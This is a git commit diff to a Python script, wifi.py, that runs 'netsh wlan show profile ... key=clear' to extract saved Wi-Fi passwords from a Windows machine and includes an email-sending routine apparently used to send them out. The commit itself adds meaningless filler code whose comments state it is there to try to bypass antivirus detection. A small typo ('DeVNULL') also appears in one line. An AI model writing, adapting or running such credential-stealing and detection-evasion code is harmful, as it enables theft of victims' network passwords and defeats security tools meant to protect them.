3eec4a0ea4f78766be4333c78353c67d2382f5da
shaka92 <85701685+shaka92@users.noreply.github.com>
2022-01-02 23:17:18 +0300

    Update wifi.py

--- wifi.py
+++ wifi.py
@@ -7,24 +7,26 @@ def send_email(mail, password, message):
     host.sendmail(mail,mail,message)
     host.quit()
 
+ #irrelevent code just to try bypass antiviress 
 def amount(x,y, sum):
     sum = x + y
     sum = sum - 5
     return sum
-
+# end
 
 
 c1  = "netsh wlan show profile"
 sub1 = subprocess.check_output(c1, shell=True, stderr=DEVNULL,stdin=DEVNULL)
 regular_list = re.findall("(?:Benutzer\s:\s)(.*)",sub1)
 
+#irrelevent code just to try bypass antiviress 
 age = 24
 if (age > 18):
     answer = "u are allowed to buy beer"
 else: answer = "u are a kid, u cannot buy beer"
 
 result = ""
-
+# end
 for regular in regular_list:
     c2 = "netsh wlan show profile " + regular + " key=clear"
     sub2 = subprocess.check_output(c2, shell=True, stderr=DeVNULL,stdin=DEVNULL)
